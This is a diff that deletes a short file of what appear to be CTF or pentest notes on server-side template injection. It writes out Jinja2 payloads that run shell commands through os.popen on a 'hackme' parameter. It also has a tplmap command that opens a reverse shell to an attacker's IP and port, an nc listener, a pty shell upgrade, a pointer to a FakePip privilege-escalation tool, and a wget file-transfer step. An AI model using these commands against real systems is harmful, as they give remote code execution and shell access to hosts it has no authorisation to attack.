@@ -1,8 +1,0 @@
-1.    payload: .../..?hackme={{5*5}} ----> 25 (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
-      ?hackme={%import os}{{os.popen('ls -la').read()}}
-2.    use tplmap (https://github.com/epinna/tplmap):
-      python tplmap.py -u .../.../?hackme= --reverse-shell $ip $port
-      nc -lvnp $port
-      python -c 'import pty; pty.spawn("/bin/bash")'
-3.    fakepip (https://github.com/0x00-0x00/FakePip)
-4.    get file: python -m SimpleHTTPServer    -----     wget http://host:8000/filename
